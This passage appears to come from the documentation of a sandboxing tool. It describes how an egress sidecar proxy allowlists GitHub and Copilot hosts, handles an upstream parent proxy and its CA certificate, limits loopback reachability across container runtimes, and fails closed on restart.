- **GitHub.** Repository hosts cannot be allowlisted in this mode. The Copilot
  profile admits only `/copilot_internal/` on `api.github.com`. Copilot CLI
  telemetry and its update check are blocked.
- **Parent proxy.** With `[egress.upstream] url`, the sidecar's policy is
  hostname-only. The parent may reach intranet hosts, so the allowlist is the
  only barrier to them. The upstream CA (`ca_cert`) is installed into each
  sandbox's trust at start, not baked into its image. On Apple `container` the
  relay to a remote parent is a host process that persists while the sidecar
  is up and listens on `127.0.0.1` only. A parent on host loopback is never
  reachable from sandboxes: on rootless Podman only the sidecar's pasta network
  forwards its port; on Docker Engine only the sidecar passes the parent
  forwarder's peer check.
- **Rootless Docker** is rejected in sidecar mode before any container work.
- **Restarts.** `down` and `restart` do not check for users: running sidecar
  sandboxes lose their connections and fail closed.
